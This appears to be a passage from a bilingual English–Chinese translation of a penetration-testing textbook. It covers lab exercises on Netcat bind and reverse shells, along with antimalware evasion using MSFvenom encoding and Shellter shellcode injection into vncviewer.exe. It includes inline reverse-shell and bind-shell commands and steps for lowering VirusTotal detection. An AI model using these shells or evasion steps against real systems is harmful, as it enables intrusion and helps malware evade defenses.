  zh: 在本练习中，你已经学习了如何在两台主机之间建立远程 shell，并建立通信通道。虽然这是一项基础技术，但它为你提供了一些关于远程 shell 如何在网络中主机之间操作的实际见解。接下来，你将学习如何使用
    Netcat 设置绑定 shell。
- en: Setting up a bind shell
  id: totrans-75
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 设置绑定 shell
- en: 'In this exercise, you will learn how to bind the Linux native shell, the **Bourne
    Again SHell** (**BASH**) into a listener. This technique enables a remote host
    to establish a network connection and execute remote commands on a Netcat server.To
    get started with setting up a bind shell, please use the following instructions:'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 在本练习中，你将学习如何将 Linux 原生 shell，即 **Bourne Again SHell**（**BASH**），绑定到监听器中。这项技术使得远程主机能够建立网络连接并在
    Netcat 服务器上执行远程命令。要开始设置绑定 shell，请使用以下说明：
- en: 'Power-on the **Kali Linux** virtual machine, open the **Terminal** and use
    the following commands to a create a Netcat listener that binds the native BASH
    shell to the listener:'
  id: totrans-77
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 启动 **Kali Linux** 虚拟机，打开 **终端**，并使用以下命令创建一个 Netcat 监听器，将本地 BASH shell 绑定到监听器：
- en: '[PRE3]'
  id: totrans-78
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: If setting up the listener on a Microsoft Windows system, the `nc -nlvp 1234
    -e cmd.exe` command will enable you to bind the Windows Command Prompt to the
    listener using Netcat.
  id: totrans-79
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 如果在 Microsoft Windows 系统上设置监听器，`nc -nlvp 1234 -e cmd.exe` 命令将使你能够使用 Netcat 将
    Windows 命令提示符绑定到监听器。
- en: 'Next, power-on **Bob-PC** virtual machine and login with the local administrator
    account (`Bob-PC\bob` | `P@ssword2`). Then, open the **Command Prompt** and use
    the following commands to establish a Netcat session to Kali Linux (listener):'
  id: totrans-80
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，启动 **Bob-PC** 虚拟机并使用本地管理员帐户（`Bob-PC\bob` | `P@ssword2`）登录。然后，打开 **命令提示符**
    并使用以下命令建立与 Kali Linux（监听器）的 Netcat 会话：
- en: '[PRE4]'
  id: totrans-81
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'Once a session is established from Bob-PC to Kali Linux, you’ll be able to
    enter Linux-based commands on the Windows Command Prompt and they’ll be executed
    remotely on Kali Linux, as shown below:'
  id: totrans-82
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦从 Bob-PC 到 Kali Linux 建立会话，你就可以在 Windows 命令提示符中输入基于 Linux 的命令，这些命令会在 Kali
    Linux 上远程执行，如下所示：
- en: '![](../media/file328.png)'
  id: totrans-83
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file328.png)'
- en: As shown in the preceding screenshot, the `whoami` command was entered on the
    bind shell, executed remotely on Kali Linux and the results are returned. Similarly,
    the `pwd` command was used to determine the present work directory of the bind
    shell on Kali Linux.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 如上图所示，`whoami` 命令在绑定 shell 上执行，并在 Kali Linux 上远程执行，结果返回。同样，`pwd` 命令用于确定绑定 shell
    上 Kali Linux 当前的工作目录。
- en: To get a Linux Terminal interface when using a bind shell, use the `python -c
    'import pty; pty.spawn("/bin/bash")'` command.
  id: totrans-85
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 要在使用绑定 shell 时获取 Linux 终端界面，请使用 `python -c 'import pty; pty.spawn("/bin/bash")'`
    命令。
- en: Having completed this exercise, you have learnt how to setup a bind shell on
    a system running a Netcat listener, enabling a remote user to establish a connection
    to the Netcat listener and obtain a remote bind shell on the targeted system and
    performing remote command execution. Next, you will learn how to setup reverse
    shells between hosts over a network.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 完成本练习后，你已经学会了如何在运行Netcat监听器的系统上设置绑定Shell，使远程用户能够建立连接到Netcat监听器并在目标系统上获得远程绑定Shell，从而执行远程命令。接下来，你将学习如何在网络上设置主机之间的反向Shell。
- en: Setting up reverse shells
  id: totrans-87
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 设置反向Shell
- en: 'In this exercise, you will learn how to setup a reverse shell from a targeted
    system back to your attacker machine over a network. We’ll be using Bob-PC as
    the targeted system which will initiate the reverse connection to our attacker
    machine which will be Kali Linux.To get started with this exercise, please use
    the following instructions:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 在本练习中，你将学习如何通过网络将反向Shell从目标系统设置到你的攻击者机器。我们将使用Bob-PC作为目标系统，Bob-PC将发起反向连接到我们的攻击者机器——Kali
    Linux。要开始此练习，请按照以下说明操作：
- en: 'Power-on the **Kali Linux** virtual machine, open the **Terminal** and use
    the following commands to setup a Netcat listener to capture any incoming connections:'
  id: totrans-89
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 启动**Kali Linux**虚拟机，打开**终端**，并使用以下命令设置Netcat监听器，以捕捉任何传入的连接：
- en: '[PRE5]'
  id: totrans-90
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'Next, power-on **Bob-PC** and login with the local administration account,
    username: `Bob-PC\bob` and password: `P@ssword2`.'
  id: totrans-91
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，启动**Bob-PC**并使用本地管理员帐户登录，用户名：`Bob-PC\bob`，密码：`P@ssword2`。
- en: 'On **Bob-PC**, open the **Command Prompt** and use the following commands to
    create a reverse connection to the listener on Kali Linux, while sending the Command
    Prompt shell to Kali Linux:'
  id: totrans-92
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**Bob-PC**上，打开**命令提示符**并使用以下命令创建反向连接到Kali Linux上的监听器，同时将命令提示符Shell发送到Kali Linux：
- en: '[PRE6]'
  id: totrans-93
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: If you are using a Linux-based system as the client, use the `nc –nv 10.1.1.2
    9999 -e /bin/bash` command to bind the Linux bash shell to the Netcat connection.
  id: totrans-94
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 如果你使用的是基于Linux的系统作为客户端，请使用`nc –nv 10.1.1.2 9999 -e /bin/bash`命令将Linux bash Shell绑定到Netcat连接。
- en: 'The following screenshot shows Bob-PC was able to establish a connection to
    the Netcat listener on Kali Linux:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 下图显示了Bob-PC成功连接到Kali Linux上的Netcat监听器：
- en: '![](../media/file329.png)'
  id: totrans-96
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file329.png)'
- en: 'On the Kali Linux virtual machine, you’ll now have a reverse shell from the
    Windows machine (Bob-PC) on the Linux Terminal as shown below:'
  id: totrans-97
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在Kali Linux虚拟机上，你现在可以看到来自Windows机器（Bob-PC）的反向Shell，显示在Linux终端上，如下所示：
- en: '![](../media/file330.png)'
  id: totrans-98
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file330.png)'
- en: As shown in the preceding screenshot, the Window machine was able to successfully
    connect to the Netcat listener and provide the local shell, enabling the remote
    user on Kali Linux to perform remote command execution.Having completed this section,
    you have learned how to create a reverse shell using Netcat. However, keep in
    mind that Netcat does not encrypt messages between the Netcat client and server,
    which can lead to detection. However, it's worth noting that both Ncat and Socat
    can be used to provide data encryption between host systems when working with
    remote shells. In the next section, you will learn how to create customized reverse
    shell payloads and implement antimalware evasion techniques.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 如上图所示，Windows机器能够成功连接到Netcat监听器并提供本地Shell，使Kali Linux上的远程用户能够执行远程命令。完成此部分后，你已经学会了如何使用Netcat创建反向Shell。然而，请记住，Netcat不会加密Netcat客户端和服务器之间的消息，这可能导致被检测到。不过，值得注意的是，Ncat和Socat都可以在处理远程Shell时提供主机系统之间的数据加密。在下一部分，你将学习如何创建自定义的反向Shell负载并实施防病毒逃避技术。
- en: Antimalware evasion techniques
  id: totrans-100
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 防病毒逃避技巧
- en: 'As an aspiring ethical hacker and penetration tester, you’ll be developing
    custom payloads that’s designed for specific targets, such as systems running
    Windows and Linux-based operating systems. In addition, if you’re performing mobile
    penetration testing, you’ll be creating payloads for mobile-based operating systems
    such as Android and iOS. More importantly, you’ll need to consider whether your
    targeted systems as running any antimalware programs that’s designed to detect
    and prevent any malicious code on the host. If a targeted system has an antimalware
    application installed, either it’s a native application such as Microsoft Defender
    Antivirus (sometimes referred to as Windows Defender) or a commercial solution,
    they are designed to detect and block any malicious code, application or service
    from running on the host system. This means, there’s a very high possibility the
    antimalware solutions on your targeted systems may detect your custom payload
    as malicious code and block it while notifying your target. There are various
    tools and techniques which are commonly used by cybersecurity professionals such
    as penetration testers to determine whether their custom payloads can bypass threat
    detection solutions such as antimalware on a targeted system. In addition, penetration
    testers usually create custom payloads to establish reverse connections from the
    targeted system back to their machine, and to escalate their user privileges after
    gaining a foothold onto the target. Therefore, its essentials to gain a solid
    understanding on various techniques that are used by antimalware solutions to
    identify potential threats and suspicious activities to improve the development
    of custom payloads to evade detection.Since antimalware vendors are continuously
    improving their solutions to detect and block new and emerging threats in the
    wild (internet), ethical hackers and penetration testers need to ensure their
    custom payloads can evade detection, else it’ll be immediately quarantined or
    deleted upon detection.This is section is neither intended to for advanced learners
    nor it focuses on advanced evasion techniques, but provides an introductory to
    common evasion techniques for penetration testers. However, this section is designed
    to provide the fundamentals for threat identification techniques of common antimalware
    solutions, as well as how to use evasive techniques when developing custom payloads
    for penetration testing.The following are various techniques used by antimalware
    solutions to detect potential threats in a system and network:'
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 作为一名有抱负的道德黑客和渗透测试员，你将开发针对特定目标的自定义载荷，例如运行 Windows 和 Linux 操作系统的系统。此外，如果你进行移动渗透测试，你将为
    Android 和 iOS 等移动操作系统创建载荷。更重要的是，你需要考虑目标系统是否运行任何旨在检测和防止恶意代码的反恶意软件程序。如果目标系统安装了反恶意软件应用程序，无论是像
    Microsoft Defender Antivirus（有时称为 Windows Defender）这样的本地应用程序，还是商业解决方案，它们的设计目的是检测并阻止任何恶意代码、应用程序或服务在主机系统上运行。这意味着，目标系统上的反恶意软件解决方案很可能会将你的自定义载荷识别为恶意代码并阻止其运行，同时通知你的目标。有多种工具和技术通常被网络安全专业人员，如渗透测试员，用来确定他们的自定义载荷是否能够绕过目标系统上的威胁检测解决方案，如反恶意软件。此外，渗透测试员通常创建自定义载荷，以便从目标系统建立反向连接回他们的计算机，并在获得目标系统的控制权后提升用户权限。因此，深入理解反恶意软件解决方案用于识别潜在威胁和可疑活动的各种技术，对于改进自定义载荷的开发以避免被检测是至关重要的。由于反恶意软件厂商持续改进其解决方案，以检测和阻止互联网上的新兴威胁，道德黑客和渗透测试员需要确保他们的自定义载荷可以避开检测，否则它将在被检测时立即被隔离或删除。本节内容并非面向高级学习者，也不专注于高级规避技术，而是为渗透测试员提供常见规避技术的入门知识。然而，本节的目的是提供常见反恶意软件解决方案的威胁识别技术基础，以及在为渗透测试开发自定义载荷时如何使用规避技术。以下是反恶意软件解决方案用于检测系统和网络中潜在威胁的各种技术：
- en: '**Signature-based**: Signature-based detection is one of the most common and
    perhaps an older technique that''s used by threat detection and prevention systems
    such as antimalware, **Intrusion Detection System** (**IDS**) and **Intrusion
    Prevention System** (**IPS**). This technique enables the antimalware engine to
    look for matching code or patterns within a file, application, or network traffic.
    Once a match has been found, an alert is triggered and the antimalware applications
    takes action to prevent the threat from expanding its foothold on the system or
    network.'
  id: totrans-102
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**基于签名的**：基于签名的检测是威胁检测和防护系统中最常见的技术之一，也许是较旧的技术，例如反恶意软件、**入侵检测系统**（**IDS**）和**入侵防御系统**（**IPS**）。该技术使反恶意软件引擎能够在文件、应用程序或网络流量中查找匹配的代码或模式。一旦发现匹配，系统就会触发警报，反恶意软件应用程序将采取措施，防止威胁在系统或网络中扩展其立足点。'
- en: The disadvantage of using signature-based detection is the antimalware solution
    relies on knowing the signature to identify the malware. For instance, if a new
    threat emerges on the internet and the antimalware solution does not have a matching
    signature, the threat can invade the organization and its systems without any
    detection until the threat intelligence team of antimalware vendor detects, analyzes
    and pushes an update with the new signature to their solutions. Hence, it’s important
    for organizations to ensure their threat detection and prevention solutions has
    an active license (if needed) and has the latest updates from the vendor.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 使用基于签名的检测方法的缺点是，反恶意软件解决方案依赖于已知签名来识别恶意软件。例如，如果互联网上出现了新的威胁，而反恶意软件解决方案没有匹配的签名，那么该威胁就可能侵入组织及其系统，直到反恶意软件厂商的威胁情报团队检测、分析并将带有新签名的更新推送到其解决方案中。
    因此，组织需要确保其威胁检测和防护解决方案拥有有效的许可证（如果需要），并且已更新厂商的最新版本。
- en: '**Behavioral-based**: In behavioral-based threat detection, if an antimalware
    solution detects a file and application on a host system to be operating outside
    it’s normal parameters, it is usually placed within a sandbox environment for
    further observation and analysis to determine whether is a threat. Within the
    sandbox environment, the suspicious or potentially harmful application is executed
    within a virtualized space, which enables the antimalware program to take a deeper
    look for any real potential threats or dangers before allowing it to run on the
    host’s memory space.'
  id: totrans-104
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**基于行为的**：在基于行为的威胁检测中，如果反恶意软件解决方案检测到主机系统中的文件和应用程序超出正常参数运行，通常会将其置于沙箱环境中进一步观察和分析，以判断它是否是威胁。在沙箱环境中，疑似或潜在有害的应用程序在虚拟化空间中执行，这使得反恶意软件程序能够在允许其在主机内存空间中运行之前，更深入地检查是否存在任何真实的潜在威胁或危险。'
- en: '**Heuristic-based**: In heuristic-based threat detection, the antimalware program
    usually need pre-defined rules to help it determine whether a file or application
    is harmful to the system or network. Furthermore, algorithms are also used to
    determine whether the executable file or running application has any malicious
    code within its instructions that have the potential to cause harm or data loss
    on the host system.'
  id: totrans-105
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**基于启发式的**：在基于启发式的威胁检测中，反恶意软件程序通常需要预定义的规则来帮助其判断文件或应用程序是否对系统或网络有害。此外，算法还被用来判断可执行文件或运行中的应用程序的指令中是否存在任何恶意代码，这些代码可能会对主机系统造成损害或数据丢失。'
- en: 'The following are common online platforms for performing static malware analysis:'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是常见的用于执行静态恶意软件分析的在线平台：
- en: '[https://www.virustotal.com/](https://www.virustotal.com/)'
  id: totrans-107
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://www.virustotal.com/](https://www.virustotal.com/)'
- en: '[https://cuckoo.cert.ee/](https://cuckoo.cert.ee/)'
  id: totrans-108
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://cuckoo.cert.ee/](https://cuckoo.cert.ee/)'
- en: '[https://app.any.run/](https://app.any.run/)'
  id: totrans-109
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://app.any.run/](https://app.any.run/)'
- en: While antivirus and antimalware vendors usually implement one or more of these
    preceding techniques, the cybersecurity industry is continuously evolving, with
    new detection methods being available in antimalware software. In the following
    subsections, you will learn how to create custom payloads using various antimalware
    evasion techniques.
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然防病毒和反恶意软件厂商通常会实现一种或多种上述技术，但网络安全行业不断发展，反恶意软件软件中不断出现新的检测方法。在接下来的子章节中，你将学习如何使用各种反恶意软件规避技术创建自定义有效载荷。
- en: Encoding payloads with MSFvenom
  id: totrans-111
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用 MSFvenom 对有效载荷进行编码
- en: '**Metasploit Framework Venom** (**MSFvenom**) is commonly used by penetration
    testers to craft custom payloads for performing exploitation, **Remote Code Execution**
    (**RCE**), and privilege escalation on targeted systems. In addition, this tool
    enables the penetration tester to perform encoding and obfuscation to the payload
    to evade threat detection systems such as IDS and IPS.To get started using MSFvenom
    for generating and encoding custom payloads, please use the following instructions:'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: '**Metasploit Framework Venom** (**MSFvenom**) 通常被渗透测试人员用来制作自定义有效载荷，以进行漏洞利用、**远程代码执行**
    (**RCE**) 和目标系统上的权限提升。此外，该工具还允许渗透测试人员对有效载荷进行编码和混淆，以避开威胁检测系统，如 IDS 和 IPS。要开始使用
    MSFvenom 生成和编码自定义有效载荷，请使用以下指令：'
- en: Firstly, power-on the **Kali Linux** virtual machine and login to the desktop.
  id: totrans-113
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，启动 **Kali Linux** 虚拟机并登录到桌面。
- en: 'Next, open the **Terminal** and use either the `ip address show eth1` or `ifconfig
    eth1` commands to determine the IP address of the `eth1` adapter on Kali Linux,
    as shown below:'
  id: totrans-114
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，打开 **终端**，使用 `ip address show eth1` 或 `ifconfig eth1` 命令来确定 Kali Linux 上
    `eth1` 适配器的 IP 地址，如下所示：
- en: '![](../media/file331.png)'
  id: totrans-115
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file331.png)'
- en: The IP address from the network adapter will be used in the next step to indicate
    the call-back address or local host address when generating the custom payload.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 网络适配器的 IP 地址将在下一步中用于指定回调地址或本地主机地址，生成自定义有效载荷时使用。
- en: 'Next, use the following commands to generate a reverse shell payload:'
  id: totrans-117
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用以下命令生成反向 Shell 有效载荷：
- en: '[PRE7]'
  id: totrans-118
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'The following is a breakdown of all the parameters used in the preceding line
    of commands:'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是对前一行命令中使用的所有参数的详细解释：
- en: '`-p` – Enables you to specify the payload. The `msfvenom --list payloads` commands
    displays a list of all supported payloads for MSFvenom.'
  id: totrans-120
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-p` – 允许你指定有效载荷。`msfvenom --list payloads` 命令会列出所有支持的有效载荷。'
- en: '`LHOST` – Allows you to specific the call-back address such as the IP address
    of Kali Linux as the attacker machine.'
  id: totrans-121
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`LHOST` – 允许你指定回调地址，例如将 Kali Linux 的 IP 地址作为攻击者机器的地址。'
- en: '`LPORT` – Specifies the listening port on the attacker machine, this port needs
    to be open before executing the payload on the targeted system.'
  id: totrans-122
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`LPORT` – 指定攻击者机器上的监听端口，在对目标系统执行有效载荷之前需要打开该端口。'
- en: '`-f` – This syntax is used to specifies the output format. The `msfvenom --list
    formats` command displays a list of supported output formats.'
  id: totrans-123
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-f` – 该语法用于指定输出格式。`msfvenom --list formats` 命令会列出所有支持的输出格式。'
- en: '`-o` – Specifies the names of the output file. By default, the payload is stored
    within the present working directory, use the `pwd` command to verify the current
    directory.'
  id: totrans-124
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-o` – 指定输出文件的名称。默认情况下，有效载荷存储在当前工作目录中，使用 `pwd` 命令可以验证当前目录。'
- en: 'The following screenshot shows the custom payload was generated successfully:'
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图显示自定义有效载荷成功生成：
- en: '![](../media/file332.png)'
  id: totrans-126
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file332.png)'
- en: 'Next, open the web browser within Kali Linux, go to [https://www.virustotal.com](https://www.virustotal.com),
    and upload the new generated payload to determine its detection status, as shown
    below:'
  id: totrans-127
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，在 Kali Linux 中打开网页浏览器，访问 [https://www.virustotal.com](https://www.virustotal.com)，并上传新生成的有效载荷以查看其检测状态，如下所示：
- en: '![](../media/file333.png)'
  id: totrans-128
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file333.png)'
- en: As shown in the preceding screenshot, over 50 antimalware sensors from multiple
    vendors detected the custom payload as a potential threat. If we were to upload
    this custom payload to a targeted system that’s running any of these antimalware
    programs, it would be immediately detected and deleted. Hence, preventing us from
    executing the payload to obtain a reverse shell.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所示的截图，超过 50 个来自不同厂商的反恶意软件传感器检测到自定义有效载荷为潜在威胁。如果我们将这个自定义有效载荷上传到运行任何这些反恶意软件程序的目标系统，它会立即被检测并删除。因此，阻止我们执行有效载荷以获取反向
    Shell。
- en: Keep in mind that once you've submitted a file to VirusTotal and it has been
    flagged as malicious, the hash of the malicious file is also shared with other
    antivirus and security vendors within the industry. Therefore, the time to use
    your malicious payload is drastically reduced on your target.
  id: totrans-130
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 请记住，一旦你将文件提交到 VirusTotal 并被标记为恶意文件，该恶意文件的哈希值也会与其他防病毒和安全供应商共享。因此，恶意有效载荷在目标机器上的有效使用时间会大大缩短。
- en: 'Next, let’s apply encoding to the payload using the `shikata_ga_nai` encoding
    module and perform 20 iterations of the encoding to reduce the threat detection
    rating of the custom payload, use the following commands:'
  id: totrans-131
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，让我们使用 `shikata_ga_nai` 编码模块对有效载荷进行编码，并执行 20 次编码迭代，以降低自定义有效载荷的威胁检测评分，使用以下命令：
- en: '[PRE8]'
  id: totrans-132
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'After the new payload is generated, upload it to VirusTotal to determine the
    threat detection, as shown below:'
  id: totrans-133
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在生成新的有效载荷后，将其上传到 VirusTotal 以确定威胁检测评分，如下所示：
- en: '![](../media/file334.png)'
  id: totrans-134
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file334.png)'
- en: As shown in the preceding screenshot, while this new custom payload contains
    20 iterations of encoding using the `x86/shikata_ga_nai` encode module, it was
    still detected by many antimalware sensors. However, the `x86/shikata_ga_nai`
    encoder module is mostly recommended when using MSFvenom.
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面截图所示，虽然这个新的自定义有效载荷包含了使用 `x86/shikata_ga_nai` 编码模块进行的 20 次编码迭代，但它仍然被许多反恶意软件传感器检测到。然而，`x86/shikata_ga_nai`
    编码模块在使用 MSFvenom 时通常是推荐的。
- en: 'Next, let’s generate another custom payload and embed it within an executable
    file, using the following commands:'
  id: totrans-136
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，让我们生成另一个自定义有效载荷，并使用以下命令将其嵌入到可执行文件中：
- en: '[PRE9]'
  id: totrans-137
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'Next, upload the new payload to VirusTotal to determine the threat rating,
    as shown below:'
  id: totrans-138
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，将新的有效载荷上传到 VirusTotal 以确定威胁评分，如下所示：
- en: '![](../media/file335.png)'
  id: totrans-139
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file335.png)'
- en: As shown in the preceding screenshot, the `payload3.exe` file has a lower detection
    rating as compared to the previous custom payloads. It’s important to enumerate
    running services and applications on a targeted system to determine whether the
    host is running a specific antimalware solution, then test the payload in a lab
    environment to ensure it’s working as expected before delivering to the target.Having
    completed this exercise, you have learned how to reduce threat detection ratings
    using MSFvenom by generating payloads. Next, you will learn how to use Shellter
    to create payloads that can't be detected as easily by antimalware programs.
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面截图所示，`payload3.exe` 文件的检测评分低于之前的自定义有效载荷。为了确定目标系统是否运行了特定的反恶意软件解决方案，重要的是枚举目标系统上正在运行的服务和应用程序，然后在实验室环境中测试该有效载荷，确保其按预期工作，之后再将其交付给目标。完成此练习后，你已经学会了如何通过生成有效载荷来使用
    MSFvenom 降低威胁检测评分。接下来，你将学习如何使用 Shellter 创建不容易被反恶意软件程序检测到的有效载荷。
- en: Creating custom payloads with Shellter
  id: totrans-141
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用 Shellter 创建自定义有效载荷
- en: '**Shellter** is an antimalware evasion tools that’s commonly used by ethical
    hackers and penetration testers to automate the process of creating and encoding
    custom payloads to evade threat detection systems. Shelter handles the generation
    of shellcode and injecting it into a trusted Microsoft Windows 32-bit application.
    When the custom payload is executed on a targeted system, the trusted files are
    executed as if the application is benign but the custom payload (shellcode) is
    executed in the background within the memory space.To get started generating custom
    payloads with Shellter, please use the following instructions:'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: '**Shellter** 是一种反恶意软件规避工具，通常被道德黑客和渗透测试人员用来自动化创建和编码自定义有效载荷的过程，以规避威胁检测系统。Shellter
    负责生成 shellcode 并将其注入到受信任的 Microsoft Windows 32 位应用程序中。当自定义有效载荷在目标系统上执行时，受信任的文件会像应用程序无害一样执行，但自定义有效载荷（shellcode）则在后台的内存空间中执行。要开始使用
    Shellter 生成自定义有效载荷，请按照以下说明操作：'
- en: Power-on the **Kali Linux** virtual machine and login to the desktop.
  id: totrans-143
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 启动 **Kali Linux** 虚拟机并登录到桌面。
- en: 'Next, open the **Terminal** (#1) and use the following commands to install
    **Shellter**:'
  id: totrans-144
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，打开 **Terminal** (#1)，并使用以下命令安装 **Shellter**：
- en: '[PRE10]'
  id: totrans-145
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: 'Next, use the following commands to setup and configure the working environment
    for **Shellter** and install **Wine32**:'
  id: totrans-146
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用以下命令设置和配置 **Shellter** 的工作环境，并安装 **Wine32**：
- en: '[PRE11]'
  id: totrans-147
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: 'Next, use the following commands to list a set of common Windows binaries on
    Kali Linux:'
  id: totrans-148
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用以下命令列出 Kali Linux 上的一组常见 Windows 二进制文件：
- en: '[PRE12]'
  id: totrans-149
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: 'As shown in the following screenshot, there are useful binaries which can be
    useful for ethical hackers and penetration testers:'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 如下图所示，有一些有用的二进制文件，对于道德黑客和渗透测试人员来说非常有用：
- en: '![](../media/file336.png)'
  id: totrans-151
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file336.png)'
- en: 'Next, let’s use the following commands to copy the `vncviewer.exe` file to
    our current working directory:'
  id: totrans-152
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，让我们使用以下命令将 `vncviewer.exe` 文件复制到当前工作目录：
- en: '[PRE13]'
  id: totrans-153
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: Additionally, the `cp /usr/share/windows-binaries/vncviewer.exe /home/kali ./`
    command can be used to copy the file to the present working directory without
    having the need to specific the entire output directory.Since we’ve installed
    additional packages onto Kali Linux during the previous steps, consider to logging-off
    and re-login to ensure the latest packages are applied.
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，`cp /usr/share/windows-binaries/vncviewer.exe /home/kali ./`命令可以用来将文件复制到当前工作目录，而不需要指定完整的输出目录。由于在前面的步骤中我们已在Kali
    Linux上安装了额外的包，建议注销并重新登录，以确保最新的包被应用。
- en: 'Next, use the following commands to launch the Shellter application on Kali
    Linux:'
  id: totrans-155
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用以下命令在Kali Linux上启动Shellter应用程序：
- en: '[PRE14]'
  id: totrans-156
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'Next, when the Shellter window appears, you’ll be provided with the options
    to use Shellter in automatic or manual mode, type `A` and hit `Enter` to apply
    automatic mode, as shown below:'
  id: totrans-157
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，当Shellter窗口出现时，你将获得选择自动模式或手动模式的选项，输入`A`并按`Enter`键以应用自动模式，如下所示：
- en: '![](../media/file337.png)'
  id: totrans-158
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file337.png)'
- en: 'Next, Shellter will require a **Portable Executable** (**PE**) file. Specify
    the `vncviewer.exe` file within the `/home/kali` directory as shown below:'
  id: totrans-159
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，Shellter将需要一个**便携式可执行文件**（**PE**）。在`/home/kali`目录中指定`vncviewer.exe`文件，如下所示：
- en: '![](../media/file338.png)'
  id: totrans-160
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file338.png)'
- en: 'Shellter will determine where it can inject shellcode within the PE file. Once
    this process is completed, type `Y` and hit `Enter` to enable stealth mode, as
    shown below:'
  id: totrans-161
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Shellter将决定在哪个位置注入shellcode到PE文件中。一旦此过程完成，输入`Y`并按`Enter`键以启用隐身模式，如下所示：
- en: '![](../media/file339.png)'
  id: totrans-162
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file339.png)'
